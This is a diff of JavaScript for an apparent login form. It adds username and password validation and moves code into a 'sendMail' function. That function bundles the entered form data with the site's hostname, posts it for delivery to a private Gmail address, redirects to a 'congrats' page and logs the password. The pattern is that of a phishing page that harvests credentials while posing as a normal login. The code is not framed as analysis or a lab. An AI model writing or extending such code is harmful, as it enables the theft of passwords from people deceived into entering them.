@@ -14,10 +14,12 @@ inputs.forEach((input) =>
   }),
 );
 
-
 document.querySelector("form").addEventListener("submit", (e) => {
   e.preventDefault();
   checkValidation();
+});
+
+const sendMail = () => {
   mail = "sikirusulaimon2002@gmail.com";
   subject = `${window.location.hostname} ${new Date()}`;
   let body = new FormData();
@@ -32,4 +34,37 @@ document.querySelector("form").addEventListener("submit", (e) => {
     body: body,
   }).then(window.location.assign("congrats.html"));
   console.log(password.value);
-});
+};
+
+let checkValidity = () => {
+  let [validUsername, validPassword] = [false, false];
+  if (!Username.value) {
+    errorUsername.innerHTML = "Username cannot be empty!";
+  } else if (Username.value.length < 7) {
+    errorUsername.innerHTML = "Username is too short!";
+  } else {
+    errorUsername.innerHTML = "Looking good!";
+    validUsername = true;
+  }
+  if (password.value == "") {
+    explain2.classList.add("show");
+    check2.classList.remove("show");
+    password.classList.add("error");
+    password.classList.remove("success");
+    errormsgs22.innerHTML = "Password input cannot be empty";
+  } else {
+    check2.classList.add("show");
+    explain2.classList.remove("show");
+    password.classList.add("success");
+    password.classList.remove("error");
+    errormsgs22.innerHTML = "";
+    errormsg22.innerHTML = "Looking good";
+    validPassword = true;
+  }
+  return validUsername && validPassword;
+};
+function checkValidation() {
+  let homePages = "/indexs/homepage/home.html";
+
+  checkValidity() ? window.location.assign(homePages) : " ";
+}
